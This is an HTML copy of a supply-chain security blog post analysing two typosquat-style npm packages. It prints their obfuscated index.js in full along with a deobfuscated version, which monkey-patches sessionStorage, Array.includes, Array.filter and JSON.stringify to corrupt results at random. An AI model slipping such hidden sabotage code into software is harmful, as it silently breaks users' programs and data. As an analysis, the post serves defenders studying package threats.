<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://blog.phylum.io/phylum-discovers-mischievous-npm-publications/">Original</a>
    <h1>Mischievous NPM Publications</h1>
    
    <div id="readability-page-1" class="page"><div>
            <p>That’s right, we’re not talking about a malicious discovery today, but rather a mischievous one. Phylum’s automated risk detection platform alerted us to the publication of some obfuscated JavaScript packages to NPM on April 24th, 2023 and after deobfuscating it, we were surprised at what we found.</p><p>--cta--</p><h2 id="the-malicious-mischievous-packages">The <s>Malicious</s> Mischievous Packages</h2><p>The (mostly) obfuscated packages are called <a href="https://app.phylum.io/package/npm/lodash-simple/1.0.0?ref=blog.phylum.io">https://app.phylum.io/package/npm/lodash-simple/1.0.0</a> and <a href="https://app.phylum.io/package/npm/lodash_tailwind/1.0.2?ref=blog.phylum.io">https://app.phylum.io/package/npm/lodash_tailwind/1.0.2</a> published by an author called craftlk. The two packages are identical and they contain the following <code>index.js</code> file:</p><figure><pre><code>(_0x2c7080 =&gt; {
  const _0x493547 =
    _0x2c7080[
      &#39;\u0073\u0065\u0073\u0073\u0069\u006f\u006e\u0053\u0074\u006f\u0072\u0061\u0067\u0065&#39;
    ][&#39;\u0067\u0065\u0074\u0049\u0074\u0065\u006d&#39;];
  _0x2c7080[&#39;\u0073\u0065\u0073\u0073\u0069\u006f\u006e\u0053\u0074\u006f\u0072\u0061\u0067\u0065&#39;][
    &#39;\u0067\u0065\u0074\u0049\u0074\u0065\u006d&#39;
  ] = function (..._0x51b975) {
    let _0x4e4c6f = _0x493547[&#39;\u0063\u0061\u006c\u006c&#39;](
      _0x2c7080[
        &#39;\u0073\u0065\u0073\u0073\u0069\u006f\u006e\u0053\u0074\u006f\u0072\u0061\u0067\u0065&#39;
      ],
      ..._0x51b975
    );
    if (Math[&#39;\u0072\u0061\u006e\u0064\u006f\u006d&#39;]() &lt; 0.05) {
      _0x4e4c6f = &#39;&#39;.split(&#39;&#39;).reverse().join(&#39;&#39;);
    }
    return _0x4e4c6f;
  };
  const _0x4a81b7 =
    Array[&#39;\u0070\u0072\u006f\u0074\u006f\u0074\u0079\u0070\u0065&#39;][
      &#39;\u0069\u006e\u0063\u006c\u0075\u0064\u0065\u0073&#39;
    ];
  Array[&#39;\u0070\u0072\u006f\u0074\u006f\u0074\u0079\u0070\u0065&#39;][&#39;includes&#39;] = function (
    ..._0x54c25c
  ) {
    if (
      this[&#39;\u006c\u0065\u006e\u0067\u0074\u0068&#39;] % (0xe1f32 ^ 0xe1f35) !==
      (0x37d9f ^ 0x37d9f)
    ) {
      return _0x4a81b7[&#39;\u0063\u0061\u006c\u006c&#39;](this, ..._0x54c25c);
    } else {
      return ![];
    }
  };
  const _0x11b939 = Array[&#39;prototype&#39;][&#39;\u0066\u0069\u006c\u0074\u0065\u0072&#39;];
  Array[&#39;\u0070\u0072\u006f\u0074\u006f\u0074\u0079\u0070\u0065&#39;][&#39;filter&#39;] = function (
    ..._0x3b996b
  ) {
    result = _0x11b939[&#39;call&#39;](this, ..._0x3b996b);
    if (new Date()[&#39;getDay&#39;]() === (0x84940 ^ 0x84940) &amp;&amp; Math[&#39;random&#39;]() &lt; 0.1) {
      result[&#39;length&#39;] = Math[&#39;\u006d\u0061\u0078&#39;](
        result[&#39;length&#39;] - (0x2864d ^ 0x2864c),
        0x6cd2c ^ 0x6cd2c
      );
    }
    return result;
  };
  const _0x140e7c = JSON[&#39;stringify&#39;];
  JSON[&#39;stringify&#39;] = function (..._0x17be51) {
    if (Math[&#39;random&#39;]() &lt; 0.1) {
      return _0x140e7c(..._0x17be51)[&#39;\u0072\u0065\u0070\u006c\u0061\u0063\u0065&#39;](/I/g, &#39;l&#39;);
    } else {
      return _0x140e7c(..._0x17be51);
    }
  };
})((0xc9e24 ^ 0xc9e24, eval)(&#39;\u0074\u0068\u0069\u0073&#39;));</code></pre><figcaption><code>index.js</code> file from both <code>lodash-tailwind</code> and <code>lodash-simple</code></figcaption></figure><p>Deobfuscated it reveals the following:</p><pre><code>(function(main) {
  const getItemFn = main[&#39;sessionStorage&#39;][&#39;getItem&#39;];
  
  main[&#39;sessionStorage&#39;][&#39;getItem&#39;] = function(...args) {
    let result = getItemFn.call(main[&#39;sessionStorage&#39;], ...args);
    if (Math.random() &lt; 0.05) {
      result = result.split(&#39;&#39;).reverse().join(&#39;&#39;);
    }
    return result;
  };
  
  const arrayPrototype = Array.prototype;
  const originalIncludes = arrayPrototype.includes;
  
  arrayPrototype.includes = function(...args) {
    if (this.length % 2 !== 0) {
      return false;
    } else {
      return originalIncludes.call(this, ...args);
    }
  };
  
  const originalFilter = arrayPrototype.filter;
  
  arrayPrototype.filter = function(...args) {
    let result = originalFilter.call(this, ...args);
    if (new Date().getDay() === 0 &amp;&amp; Math.random() &lt; 0.1) {
      result.length = Math.max(result.length - 1, 0);
    }
    return result;
  };
  
  const originalStringify = JSON.stringify;
  
  JSON.stringify = function(...args) {
    if (Math.random() &lt; 0.1) {
      return originalStringify(...args).replace(/I/g, &#39;l&#39;);
    } else {
      return originalStringify(...args);
    }
  };
  
})(this);</code></pre><p>Okay, before we look at these functions in more detail, let me ask you a few questions. Are you tired of the monotony of straightforward, predictable programming? Do you long for a life of danger and unpredictability? Are you just dying for more non-deterministic behavior in your JavaScript projects? If you answered “yes” to any of those questions, then hold on to your keyboards folks, because you’ve come to the right place! Get ready to shake things up and say goodbye to your boring old code, because these packages are about to turn your world upside down!</p><p>They consist of a series of monkey patches that modify the behavior of various built-in JavaScript functions. These modifications introduce random and unpredictable behavior to the otherwise deterministic behavior of these functions. If this sounds like your brand of fun, then follow me!</p><h2 id="session-storage-retrieval-roulette">Session Storage Retrieval Roulette</h2><p>If you’re like me and tired of getting the same old predictable values out of your session storage, look no further!</p><pre><code>const getItemFn = main[&#39;sessionStorage&#39;][&#39;getItem&#39;];
  
  main[&#39;sessionStorage&#39;][&#39;getItem&#39;] = function(...args) {
    let result = getItemFn.call(main[&#39;sessionStorage&#39;], ...args);
    if (Math.random() &lt; 0.05) {
      result = result.split(&#39;&#39;).reverse().join(&#39;&#39;);
    }
    return result;
  };</code></pre><p>This code will randomly reverse the string retrieved from the session storage with just a 5% probability. It adds just the right amount of spice to your otherwise dull and monotonous JavaScript code. Who knew retrieving session storage items could be so exciting?</p><h2 id="oddly-even-inclusion">Oddly Even Inclusion</h2><p>Predictable array inclusion checks are soo 2022.</p><pre><code>const arrayPrototype = Array.prototype;
  const originalIncludes = arrayPrototype.includes;
  
  arrayPrototype.includes = function(...args) {
    if (this.length % 2 !== 0) {
      return false;
    } else {
      return originalIncludes.call(this, ...args);
    }
  };
</code></pre><p>With this little snippet, you can now experience the thrill of never knowing whether or not your arrays include a certain element. This function returns <code>false</code> when calling <code>includes()</code> on an array of odd length, making your code about as unpredictable as the weather.</p><h2 id="sunday-funday">Sunday Funday</h2><p>Weekends are supposed to be for relaxing right? Right?? Don’t tell that to this JavaScript function!</p><pre><code>const originalFilter = arrayPrototype.filter;
  
  arrayPrototype.filter = function(...args) {
    let result = originalFilter.call(this, ...args);
    if (new Date().getDay() === 0 &amp;&amp; Math.random() &lt; 0.1) {
      result.length = Math.max(result.length - 1, 0);
    }
    return result;
  };
</code></pre><p>This doozy randomly removes an element with 10% probability from an array returned by the <code>filter()</code> method, but only on Sundays! So, if you thought you could trust your code to take a break on the weekends, think again.</p><h2 id="stringing-us-along">Stringing Us Along</h2><p><code>JSON.stringify</code> is a pretty straightforward function, right? Not anymore!</p><pre><code>const originalStringify = JSON.stringify;
  
  JSON.stringify = function(...args) {
    if (Math.random() &lt; 0.1) {
      return originalStringify(...args).replace(/I/g, &#39;l&#39;);
    } else {
      return originalStringify(...args);
    }
  };
</code></pre><p>With this code, you can add some much-needed unpredictability to your serialization process. This function will randomly replace all the occurrences of the letter &#39;I&#39; (uppercase i) with the letter &#39;l&#39; (lowercase L), but only with a 10% probability. So, if you&#39;re tired of boring and predictable JSON output, then this gem is for you! And depending on your font, you might not even notice! Here’s to living life on the edge!</p><h2 id="conclusion">Conclusion</h2><p>While we&#39;ve had some fun exploring the bizarre and random behavior of this obfuscated JavaScript, it&#39;s important to remember that this package is readily available on NPM with a seemingly harmless name. While it may not be malicious in intent, the unpredictable behavior it introduces could cause serious headaches for developers trying to debug their code. It’s also worth noting that obfuscated code hiding behind benign package names is a very common tactic among actual malware authors. As far as I’m concerned, it’s safer to treat all obfuscated code as malicious until proven otherwise. After all, there’s a reason the author obfuscated it in the first place; they don’t want you to know what it’s doing! Stay vigilant my friends!</p>
        </div></div>
  </body>
</html>
